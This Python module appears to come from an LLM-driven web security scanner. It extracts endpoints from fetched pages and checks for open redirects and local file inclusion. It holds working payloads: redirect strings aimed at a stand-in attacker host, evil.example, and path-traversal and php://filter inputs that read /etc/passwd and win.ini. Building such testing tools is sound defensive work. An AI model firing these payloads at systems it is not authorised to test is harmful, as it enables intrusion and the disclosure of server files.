"""Endpoint & finding oracles: extract targets from a page + open redirect + LFI.

extract_endpoints: parse an already-fetched body for links, forms, and inline
script URLs. Does NOT crawl (no fetching). Gives the LLM a menu of concrete
endpoints/params it can then test with the existing tools. Zero extra traffic.

verify_open_redirect: a single deterministic oracle. Feed param values that a
redirect endpoint might honor; confirmed when the response Location points at an
attacker-controlled host.

verify_lfi: deterministic content-signature oracle. Send a traversal payload,
match /etc/passwd or win.ini fingerprints in the body.
"""
from __future__ import annotations

import re
from dataclasses import dataclass, field
from typing import Any
from urllib.parse import urljoin, urlsplit

from .http_client import Probe, Response


# ---- extract_endpoints (parse-only) ----------------------------------------

_LINK_RE = re.compile(r'''(?:href|src|action|data-url)\s*=\s*["']([^"'\s>]+)''', re.IGNORECASE)
_STATIC_EXTS = (".css", ".png", ".jpg", ".jpeg", ".gif", ".svg", ".woff", ".woff2", ".ico", ".map", ".ttf", ".otf")
_FORM_RE = re.compile(r'<form\b([^>]*)>(.*?)</form>', re.IGNORECASE | re.DOTALL)
_INPUT_RE = re.compile(r'''<(?:input|textarea|select)\b[^>]*\bname\s*=\s*["']([^"']+)''', re.IGNORECASE)
_METHOD_RE = re.compile(r'''method\s*=\s*["']([^"']+)''', re.IGNORECASE)
_ACTION_RE = re.compile(r'''action\s*=\s*["']([^"']*)''', re.IGNORECASE)
# spot inline API paths in JS bundles
_JS_PATH_RE = re.compile(r'''["'](/[a-zA-Z0-9._/\-]+(?:\?[^"']*)?)["']''')


@dataclass
class Endpoint:
    url: str
    kind: str          # link | form | script-path
    method: str = "GET"
    params: list[str] = field(default_factory=list)

    def to_dict(self) -> dict[str, Any]:
        d = {"url": self.url, "kind": self.kind}
        if self.method != "GET":
            d["method"] = self.method
        if self.params:
            d["params"] = self.params
        return d


def extract_endpoints(base_url: str, body: str, include_external: bool = False) -> list[Endpoint]:
    """Parse links, forms, and inline paths from an already-fetched body.
    Resolves against base_url. Same-origin only unless include_external=True."""
    origin = urlsplit(base_url)
    origin_key = (origin.scheme, origin.netloc)
    out: dict[tuple, Endpoint] = {}

    for raw in _LINK_RE.findall(body):
        if raw.startswith(("javascript:", "mailto:", "tel:", "#", "data:")):
            continue
        if raw.lower().split("?", 1)[0].split("#", 1)[0].endswith(_STATIC_EXTS):
            continue
        u = urljoin(base_url, raw)
        parts = urlsplit(u)
        if not include_external and (parts.scheme, parts.netloc) != origin_key:
            continue
        key = ("link", u)
        out.setdefault(key, Endpoint(url=u, kind="link"))

    for form_attrs, form_body in _FORM_RE.findall(body):
        method_m = _METHOD_RE.search(form_attrs)
        action_m = _ACTION_RE.search(form_attrs)
        action = action_m.group(1) if action_m else base_url
        u = urljoin(base_url, action)
        parts = urlsplit(u)
        if not include_external and (parts.scheme, parts.netloc) != origin_key:
            continue
        params = list({n for n in _INPUT_RE.findall(form_body)})
        method = (method_m.group(1) if method_m else "GET").upper()
        key = ("form", u, method)
        out[key] = Endpoint(url=u, kind="form", method=method, params=params)

    for path in _JS_PATH_RE.findall(body):
        low = path.lower().split("?", 1)[0]
        if low.endswith(_STATIC_EXTS):
            continue
        if len(path) < 3:
            continue
        u = urljoin(base_url, path)
        key = ("js", u)
        out.setdefault(key, Endpoint(url=u, kind="script-path"))

    return list(out.values())


# ---- verify_open_redirect --------------------------------------------------

_REDIRECT_PAYLOADS = [
    "https://evil.example/",
    "//evil.example/",
    "/\\evil.example/",
    "https:evil.example/",
    "https://target%40evil.example/",  # userinfo trick
]


@dataclass
class RedirectVerdict:
    confirmed: bool
    param: str
    payload_that_landed: str | None
    location: str | None
    evidence: list[str] = field(default_factory=list)

    def to_dict(self) -> dict[str, Any]:
        return {
            "confirmed": self.confirmed,
            "oracle": "open_redirect",
            "param": self.param,
            "payload_that_landed": self.payload_that_landed,
            "location": self.location,
            "evidence": self.evidence,
        }


def verify_open_redirect(
    probe: Probe, *, method: str, url: str, param: str, in_body: bool = False,
    attacker_host: str = "evil.example",
) -> RedirectVerdict:
    evidence: list[str] = []
    payloads = [p.replace("evil.example", attacker_host) for p in _REDIRECT_PAYLOADS]
    for pl in payloads:
        if in_body:
            r = probe.send(method, url, data={param: pl})
        else:
            r = probe.send(method, url, params={param: pl})
        loc = r.headers.get("location") or r.headers.get("Location", "")
        evidence.append(f"payload={pl!r} status={r.status} location={loc!r}")
        if r.status in (301, 302, 303, 307, 308) and loc:
            # confirmed when Location host resolves to attacker-controlled
            netloc = urlsplit(loc if "://" in loc else "http:" + loc if loc.startswith("//") else "http://x" + loc).netloc
            if attacker_host in netloc.lower():
                return RedirectVerdict(True, param, pl, loc, evidence + [
                    f"Location host is attacker-controlled ({attacker_host}) -> open redirect"
                ])
    return RedirectVerdict(False, param, None, None, evidence)


# ---- verify_lfi ------------------------------------------------------------

_LFI_UNIX_PAYLOADS = [
    "../../../../etc/passwd", "..%2f..%2f..%2f..%2fetc%2fpasswd",
    "....//....//....//....//etc/passwd", "/etc/passwd",
    "..%252f..%252f..%252fetc/passwd",
    "php://filter/convert.base64-encode/resource=/etc/passwd",
]
_LFI_WIN_PAYLOADS = [
    "..\\..\\..\\..\\windows\\win.ini",
    "..%5c..%5c..%5cwindows%5cwin.ini",
    "C:\\windows\\win.ini",
]

_UNIX_SIG = re.compile(r"root:[x*]:0:0:", re.MULTILINE)
_WIN_SIG = re.compile(r"\[fonts\]|\[extensions\]|for 16-bit app support", re.IGNORECASE)
# base64('root:x:0:0:')
_UNIX_B64_SIG = re.compile(r"cm9vdDp4OjA6M[Aa]")


@dataclass
class LfiVerdict:
    confirmed: bool
    param: str
    payload_that_landed: str | None
    signature_matched: str | None
    evidence: list[str] = field(default_factory=list)

    def to_dict(self) -> dict[str, Any]:
        return {
            "confirmed": self.confirmed,
            "oracle": "lfi",
            "param": self.param,
            "payload_that_landed": self.payload_that_landed,
            "signature_matched": self.signature_matched,
            "evidence": self.evidence,
        }


def verify_lfi(
    probe: Probe, *, method: str, url: str, param: str, in_body: bool = False,
    target_os: str = "auto",
) -> LfiVerdict:
    payloads: list[tuple[str, str]] = []
    if target_os in ("auto", "unix"):
        payloads += [("unix", p) for p in _LFI_UNIX_PAYLOADS]
    if target_os in ("auto", "windows"):
        payloads += [("win", p) for p in _LFI_WIN_PAYLOADS]

    evidence: list[str] = []
    for kind, pl in payloads:
        if in_body:
            r = probe.send(method, url, data={param: pl})
        else:
            r = probe.send(method, url, params={param: pl})
        body = r.body_text or r.body_snippet
        evidence.append(f"payload={pl!r} status={r.status} len={r.length}")
        if kind == "unix":
            if _UNIX_SIG.search(body):
                return LfiVerdict(True, param, pl, "/etc/passwd content", evidence + [
                    "matched 'root:x:0:0:' signature -> file contents disclosed"
                ])
            if _UNIX_B64_SIG.search(body):
                return LfiVerdict(True, param, pl, "/etc/passwd (base64)", evidence + [
                    "matched base64('root:x:0:0:') -> php://filter LFI"
                ])
        else:
            if _WIN_SIG.search(body):
                return LfiVerdict(True, param, pl, "win.ini content", evidence + [
                    "matched win.ini section signature -> file contents disclosed"
                ])
    return LfiVerdict(False, param, None, None, evidence)
